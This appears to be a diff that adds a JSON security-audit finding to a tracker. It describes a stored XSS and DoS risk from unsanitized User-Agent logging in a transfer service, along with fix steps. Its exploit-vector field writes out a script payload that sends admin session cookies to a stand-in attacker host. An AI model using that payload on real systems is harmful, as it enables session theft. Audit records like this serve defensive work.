@@ -1,0 +1,32 @@
+{
+  "node_id": "f1000006",
+  "node_type": "vulnerability",
+  "node_index": 11,
+  "label": "Vuln-6",
+  "title": "Unsanitized User-Agent Header Stored in Event Log",
+  "description": "The get_download_payload method in Transfer__Service.py (line 91-94) stores the raw User-Agent header value directly into the events list without any sanitization or length limit. The User-Agent header is attacker-controlled and can contain arbitrary content. If event data is ever rendered in an admin dashboard, log viewer, or reporting tool without escaping, this becomes a stored XSS vector. Additionally, extremely long User-Agent strings can be used for memory-based DoS.",
+  "status": "open",
+  "created_at": 1739318400000,
+  "updated_at": 1739318400000,
+  "created_by": "appsec",
+  "tags": ["vulnerability", "injection", "stored-xss", "medium"],
+  "links": [
+    {
+      "link_type_id": "4f012722",
+      "verb": "task-of",
+      "target_id": "e1000001",
+      "target_label": "AppSec-1"
+    }
+  ],
+  "properties": {
+    "severity": "Medium",
+    "owasp_category": "A03:2021 Injection",
+    "cwe": "CWE-79 (Stored XSS), CWE-117 (Improper Output Neutralization for Logs)",
+    "affected_file": "sgraph_ai_app_send/lambda__user/service/Transfer__Service.py",
+    "affected_lines": "91-94 (user_agent stored in events append)",
+    "exploit_vector": "1. Send GET /transfers/download/{valid_id} with User-Agent: <script>document.location='https://evil.com/?c='+document.cookie</script>. 2. The malicious user-agent is stored in the transfer's events list. 3. When an admin views this transfer's events in a dashboard, the script executes, exfiltrating session cookies.",
+    "fix_recommendation": "1. Sanitize User-Agent by stripping HTML/script tags and limiting length (max 256 chars). 2. Validate User-Agent against a reasonable character whitelist (printable ASCII). 3. Ensure any admin UI rendering of events uses proper HTML escaping. 4. Consider not storing User-Agent at all if it is not essential for analytics.",
+    "priority": "P1",
+    "role_assignment": "appsec"
+  }
+}
